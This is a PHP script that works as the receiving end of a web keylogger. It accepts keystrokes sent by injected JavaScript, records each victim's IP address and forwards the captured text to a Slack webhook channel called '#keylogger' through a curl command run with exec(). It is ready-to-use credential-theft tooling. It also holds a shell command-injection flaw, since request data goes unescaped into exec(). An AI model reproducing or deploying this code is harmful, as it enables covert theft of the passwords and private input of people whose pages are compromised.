<?php

// Update These Values
$Slack_Webhook_URL = "https://hooks.slack.com/services/YOUR_SLACK_WEBHOOK_URL_HERE";
$Slack_Channel = "#keylogger";

// Grab IP Address of the Client
$IP = $_SERVER['REMOTE_ADDR'];

// Accept "key" Parameter From Injected JavaScript
if(isset($_REQUEST['key'])){$key = $_REQUEST['key'];

// Format the Text
$keyarray = explode(',',$key);

$text = "";

$arraylength = count($keyarray) - 1;

$i = 0;

while($i < $arraylength){
$keyarray[$i] = trim($keyarray[$i], '[');
$keyarray[$i] = trim($keyarray[$i], '"');
$text = $text.$keyarray[$i];
$i = $i + 1;
}

// Post to Slack Channel
$cmd4 = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$Slack_Channel.'", "username": "Keylogger ('.$IP.')", "text": "> '.$text.'", "icon_emoji": ":keyboard:"}\' '.$Slack_Webhook_URL;
exec($cmd4);

}

?>
